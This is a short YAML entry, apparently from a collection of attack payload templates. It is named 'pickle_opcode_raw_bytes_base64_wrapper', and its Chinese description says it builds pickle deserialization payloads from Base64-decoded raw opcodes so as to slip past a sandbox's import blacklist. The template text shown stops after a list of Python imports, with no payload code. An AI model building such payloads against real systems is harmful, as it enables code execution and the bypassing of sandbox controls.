- name: pickle_opcode_raw_bytes_base64_wrapper
  description: 增加一种完全不依赖 `import pickle` 的 Payload 构造模板，字节序列通过 Base64 解码注入，可规避沙箱的模块导入黑名单。
  lang: python
  template: "import requests\nimport json\nimport re\nimport base64\nimport hashlib\n\
    import hmac\nimport struct\nimport binascii\nimport html\nimport xml\nimport xml.etree.ElementTree\
    \ as ET\nfrom bs4 import BeautifulSoup\nimport lxml\nimport jwt\nimport time\n\
